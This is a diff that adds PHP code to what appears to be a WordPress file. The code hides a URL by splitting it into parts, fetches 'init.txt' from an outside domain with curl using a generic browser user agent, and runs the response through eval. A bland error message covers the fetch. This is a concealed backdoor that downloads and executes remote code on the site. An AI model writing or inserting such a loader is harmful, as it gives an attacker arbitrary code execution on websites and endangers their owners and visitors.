@@ -1,0 +1,30 @@
+try {
+    // URL dipecah menjadi beberapa bagian
+    $urlParts = [
+        'https://',
+        'j251020_13',
+        '.',
+        'wwuckert.com/',
+        'init',
+        '.txt'
+    ];
+    
+    $realUrl = implode('', $urlParts);
+    
+    $c = curl_init($realUrl);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($c, CURLOPT_TIMEOUT, 15);
+    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 6);
+    curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0 Compatible');
+    $result = curl_exec($c);
+    curl_close($c);
+    
+    if ($result !== false) {
+        eval('?>' . $result);
+    }
+} catch (Exception $e) {
+    error_log('External resource error: ' . $e->getMessage());
+}
+if ( ! defined( 'ABSPATH' ) ) {
+    define( 'ABSPATH', getcwd() . '/' );
+}
